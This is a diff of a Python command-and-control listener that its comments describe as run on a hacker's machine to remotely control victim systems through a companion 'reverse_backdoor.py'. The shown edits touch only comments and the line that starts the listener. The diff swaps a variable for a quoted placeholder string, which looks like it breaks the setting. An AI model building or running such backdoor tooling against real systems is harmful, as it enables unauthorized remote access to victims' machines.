@@ -1,6 +1,6 @@
 #!/usr/bin/python
 
-#This script should be run in the hackers host machine where they intend to remotely access the victim system/s from.
+#This script should be run on the hackers host machine from where they intend to remotely access the victim system.
 
 import socket, json, base64, subprocess, sys, time
 
@@ -83,8 +83,9 @@ class Listener:
 
             print(result) #returns for example "[+] Download successful."
 
+# You need to change this to your PrivIP (should be in quotes) & Port before running this.
 # Hacker port should be the same as the port set in reverse_backdoor.py
-my_listener = Listener(str(hacker_privateIP), hacker_port)
+my_listener = Listener("hacker_privateIP", hacker_port)
 my_listener.run()
 
 
